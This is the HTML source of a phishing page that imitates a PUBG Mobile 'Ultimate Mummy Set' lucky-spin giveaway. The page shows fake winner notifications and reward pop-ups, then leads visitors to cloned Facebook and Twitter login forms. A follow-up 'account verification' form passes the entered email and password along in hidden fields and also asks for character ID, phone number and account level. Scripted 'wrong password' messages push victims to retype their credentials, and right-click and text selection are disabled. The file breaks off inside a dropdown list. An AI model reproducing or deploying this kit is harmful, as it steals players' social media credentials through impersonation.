<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PUBG MOBILE EVENT | Ultimate Mummy Set</title>
<meta property="og:description" content="Start Free Lucky Spin and Collect your exclusive reward from PUBG MOBILE now!">
<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link href="./index_files/css" rel="stylesheet">
<link rel="stylesheet" href="css-zone/facebook.css">
<link rel="stylesheet" href="css-zone/twitter.css">
<link rel="stylesheet" href="css-zone/animate.css">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
<script type="text/javascript" src="js-zone/jquery.js"></script>
<script type="text/javascript" src="js-zone/main-zone.js"></script>
<script language="JavaScript">
document.write(ls())
</script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'pubgFont'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/pubg.woff2) format("woff2"), 
        url(fonts/pubg.woff) format("woff"),
        url(fonts/pubg.ttf) format("truetype");}
}
.landing {
	background: url(img/landing.jpg) no-repeat center center;
	background-size: cover;
	width:100%;
	height:auto;
}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 65px;
}
.navbar-logo {
	width: 59px;
	float: left;
	margin-top: 11px;
	margin-left: 11px;
}
.navbar-shop {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}
.navbar-language {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}
.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 46px;
	height: 45px;
	margin-top: 10px;
	margin-right: 10px;
	border-radius: 7px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.slider-container {
    border: none;
}
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
}
.header video {
	width: 100%;
	border:none;
}
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
  border: none;
}
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}
  .footer {
	border: none;
	display: block;
}
.footer-copyright-icon {
	width: 55%;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	display: block;
}
.footer-txt-copyright {
	color: #bdbdbd;
	font-size: 15px;
	font-family:Teko;
	text-align: center;
	margin-top: 3px;
}
.footer-txt-copyrights {
	color: #bdbdbd;
	font-size: 15px;
	font-family:Teko;
	text-align: center;
	margin-top: 5px;
}
.season-logo {
	width:20%;
	margin:15px;
	float:left;
}
.season-logos {
	width:40%;
	margin:5px;
	float:right;
}
.season-slogan {
	width: 100%;
	margin-top: 100%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.season-btn {
	background: url(/img/btn-on.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	padding-left: 30px;
	padding-right: 30px;
	font-size: 18px;
	font-family:pubgFont;
	font-weight: 500;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-btn:hover {
	background: url(../img/menu_on.png) no-repeat center;
	background-size: 100% 100%;
	color: #000;
	transition: 0.5s;
}
.event-title {
	color: #ffca13;
	font-size: 2.5rem;
	font-family: Teko;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
	text-shadow: 1.3px 1.3px 0px rgba(0, 0, 0);
	letter-spacing: 1px;
}
.event-subtitle {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -15px;
    margin-bottom: 25px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}
.event-subtitle>span {
    display: inline-block;
    position: relative;
    color: #ffca13;
    cursor: default;
    font-size: 1.4rem;
	text-shadow: 1px 1px 0px rgba(0, 0, 0);
}
.event-subtitle>span:before,
.event-subtitle>span:after {
    background: #ffca13;
	border-bottom: 2px solid #ffca13;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.event-subtitle>span:before {
    margin-right: 15px;
    right: 100%;
}
.event-subtitle>span:after {
    left: 100%;
    margin-left: 15px;
}
.event-notification {
    background: url(img/alert.jpg) no-repeat center;
	background-size: 100% 100%;
	width: 90%;
	height:60px;
	padding:7px;
	padding-top:-20px;
	margin-right: auto;
	margin-left: auto;
	margin-top: -18px;
	margin-bottom: 20px;
}
.event-notification-text {
	padding-top:15px;
	text-align:center;
	font-family:pubgFont;
	color:#B29D79;
	font-size:17px;
	text-shadow: 0.5px 0.5px 0px #000;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrapper {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'pubgFont';
	color:#fff;
}
.popup-box-navbar {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 9px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbar-title {
	padding-left: 12px;
	padding-top: 12px;
	padding-bottom: 2px;
	font-size: 22px;
	font-family:pubgFont;
	font-weight: 500;
	text-align: left;
	text-decoration: none;	
	background: -webkit-linear-gradient(#3F1739, #610C2B);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.popup-box-bg {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:pubgFont;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:pubgFont;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:pubgFont;
	font-weight: 500;
	text-align: right;
	display: block;
}
.popup-box-alert3 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:pubgFont;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:pubgFont;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 50px;
	text-align: center;
}
.popup-box-item {
	background-size:100% 100%;
	width:25%;
	height:90px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	display: block;
}
.popup-box-item img {
	width:100%;
	height:100%;
}
.popup-box-item span {
	color: #fff;
	font-size: 22px;
	font-family: pubgFont;
	text-align: right;
	position: absolute;
	left: 0;
	right: 2px;
	bottom: -5px;
}
.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup-box-form input {
	background: #3C2414;
	width: 100%;
	height: auto;
	margin-bottom: 3px;
	padding: 4px;
	color: #B29D79;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border: 1px solid #B29D79;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-form input::placeholder {
	color: #B29D79;
}
.popup-box-form select {
	background: #3C2414;
	width: 100%;
	height: auto;
	margin-bottom: 8px;
	padding: 5.5px;
	color: #B29D79;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border: 1px solid #B29D79;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 45px;
}
.popup-box-footer button {
	background: url(img/btn-on2.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: pubgFont;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-form-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: -17px;
}
.popup-box-form-footer button {
	background: url(img/btn-on2.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: pubgFont;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-btn-login {
    width: 40%;
    height: auto;
    padding: 6px;
    margin: 5px;
    color: #000;
	font-size: 15px;
    font-family:pubgFont;
    border: none;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}
.popup-btn-login i {
    color: #fff;
    font-size: 23px;
    float: left;
}
.popup-btn-facebook {
    background: #4167B2;
    color: #fff;
}
.popup-btn-twitter {
    background: #198B96;
    color: #fff;
}
.popup-btn-login-wrapper {
    width: 85%;
    height: 50px;
	margin-left: auto;
	margin-right: auto;
    border: none;
    outline: none;
	display: block;
}
.popup-btn-login-wrapper-icon {
	width: 50px;
	height: 100%;
	margin-top: -4px;
	float: left;
}
.popup-btn-login-wrapper-icon img {
	width: 100%;
	height: 100%;
}
.popup-btn-login-content {
	background: rgba(58, 36, 18, 0.8);
	width: 86%;
	height: 42px;
	margin-top: -46px;
	padding: 8px;
	color: #E4C870;
	font-size: 18px;
	font-family:'Teko';
	text-align: center;
	border: 1px solid #805E39;
	border-left: none;
	float: right;
}
.popup-login {
	background:rgba(0,0,0,0.4);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.balance {
	background:url(../img/bg-item.png) no-repeat center center;
	background-size:101% 100%;
	width: 94.3%;
	height: 100px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 4px;
	border-top:2px solid #ffbe21;
	border-left:2px solid #ffbe21;
	border-right:2px solid #ffbe21;
	border-bottom:2px solid #ffbe21;
	display: block;
}
.balance-img {
	width: 50%;
	height: 97px;
	margin-top: -5px;
	margin-right: 5px;	
	float: left;	
	padding: 5px;
	border:1px #fff;  
}
.balance-nom {
	color: #fff;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	font-size: 18px;
	font-family:pubgFont;
	font-weight: 500;
	text-align: center;
	text-shadow:0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 18px;
	float: left;
}
.balance-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family:pubgFont;
	text-align: left;
}
.balance-nom-button {
	background:url(../img/btn-on.png) no-repeat center center;
	background-size:100% 100%;
    width: 36%;
	height: auto;
	margin-top:7px;
	margin-left:auto;
	margin-right:auto;
	padding: 10px;
	font-size: 18px;
	color:#000;
	font-family:pubgFont;
	text-align: center;
	border: none;
	outline: none;
	float: center;
}
.box {
    width: 95%;
    height: auto;
    margin-left:auto;
    margin-right:auto;
	margin-bottom: 12px;
	position: relative;
	display: block;
} 
.scroll {
	width:100%;
	overflow:none;
	position:relative;
	width: 100%;
	height:400px;
	margin-top:11px;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-co
}
.btn-wrapper {
	width: 100%;
	height: auto;
	margin-top: 20px;
	margin-bottom: -20px;
	margin-left:auto;
	margin-right:auto;
	align-items:center;
	justify-content:space-around;
	display:flex;
}
.btn-wrapper button {
    background: url(../img/start.png) no-repeat center;
	background-size: 100% 100%;
	width: 47%;
	height: 50px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom: 30px;
	padding: 15px;
	color: #000;
	font-size: 18px;
	font-family: pubgFont;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
	display: inline-block;
}
.alert {
	background: url(img/selow.jpg) no-repeat center;
	background-size: 100% 100%;
	width: 100%;
	height: 83px;
	margin-left: auto;
	margin-right: auto;
	border-left: 2px solid #B29D79;
	border-right: 2px solid #B29D79;
	border-top: 2px solid #B29D79;
	border-bottom: 2px solid #B29D79;
	display: block;
}
figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}
.itemShine {
	position: relative;
}
.itemShine::before {
	background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	width: auto;
	height: auto;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}
.itemShine::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}
@-webkit-keyframes shine {
	100% {
		left: 125%;
		}
}
@keyframes shine {
	100% {
		left: 125%;
		}
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
@media only screen and (max-width:600px) {
    .containerLanding, .containerHome {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
        border-radius: 0px;
        padding: 0px;
     }
    .gallery-container {
	    width: 100%;
	    max-width:450px;
		height: auto;
		border: none;
    }
    .notification, .notification-container {
         border: none;
    }
    .box {
	    width: 95%;
		height: auto;
	}
    .scroll {
        height: 400px;
    }
    .event-title {
        height: 105px;    
    }
    .alert {
        border-right: none;  
        border-left:none;       
}
    .popup-box-wrapper {
        width: 350px;
        margin-top: 60%;
    }
    .popup-box-item {
        width: 25%;
        height: 85px;
    }
    .popup-box-login-fb {
        margin-top: 4%;
    }
    .popup-box-login-twitter {
        margin-top: 25%;
    }
}
</style>       
<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video style="width: 100%;" src="img/nizam.mp4" autoplay loop muted></video>
</div><!--- header --->
</div>
</div>
</div>
<div class="gallery-container">
<div class="cont">
<div class="cont spin_content">
<section class="container" id="js-lotto">
<div class="square" data-order="0">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/1.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon></svg></div>
</div>
<div class="square" data-order="1">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift2" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/2.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon></svg></div>
</div>
<div class="squar" data-order="5">
<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/3.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon></svg></div>
</div>
<div class="start squar__start-btn">
<div>
<center>
<o onclick="audioFile()" onmousedown="buka.play();"><img src="img/draw.png" width="95" height="95" id="js-start"></o>
</center>
</div>
</div>
<div class="squar" data-order="2">
<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/4.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon></svg></div>
</div>
<div class="square" data-order="4">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/5.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon></svg></div>
</div>
<div class="square" data-order="3">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/6.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon></svg></div></div>
</div>
<div class="event-notification">
<div class="event-notification-text">
<div class="slider animated fadeIn">!ID 5883485425 Successful Get M416 Glacier </div>
<div class="slider animated fadeIn">!ID 5295893347 Successful Get Mummy Set</div>
<div class="slider animated fadeIn">!ID 5963737318 Successful Get Koenisegg Cars</div>
<div class="slider animated fadeIn">!ID 5888686451 Successful Get 10 Materials</div>
<div class="slider animated fadeIn">!ID 5155030554 Successful Get Inferno Helmet</div>
<div class="slider animated fadeIn">!ID 5463336783 Successful Get 12000 UC</div>
</div></div>
</section> <!--- container --->
</div> <!--- cont spin_content --->
</div> <!--- gallery-container --->
<div class="footer">
<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/jnLQLD1x/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Thwcks3z/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/bdB94RGs/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/YvcfCqz7/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/w7RQzsJF/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Sxyy8Kzz/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2023 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2023 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->

<div class="popup open_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Congratulation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>You got this reward!</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img class="popup-item" src="">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup open_rewards --->

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"></div> <!--- popup-box-alert --->
<img style="width: 70%; height: auto; margin-top: -20px; margin-left: auto; margin-right: auto;" src="https://i.postimg.cc/1tGbpgvj/20220817-215258.png">
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Twitter</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
<img style="width: 90%; height: auto; margin-top: -30px; margin-left: auto; margin-right: auto;" src="https://i.postimg.cc/MHdrrT91/selows.png">
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://i.ibb.co/Wg8qQxh/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email or phone number you entered does not match any account. <b>Find your account.</b></p>
<p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you forget your password?</b></p>
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">
 Log in to your Facebook account to connect to PUBG MOBILE.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<label>
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
</label><label>
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')"></label>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Facebook Inc.</div>
</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<center>
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png">
</center>
<div class="box-twitter">
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Phone, Email or Username')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- TwitterShowPassword --->
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- TwitterHidePassword --->
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login--->

<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Complete your account details</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" maxlength="5" autocomplete="off" required oninvalid="this.setCustomValidity('Input Your Character ID Correctly')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" maxlength="5" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number Correctly')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
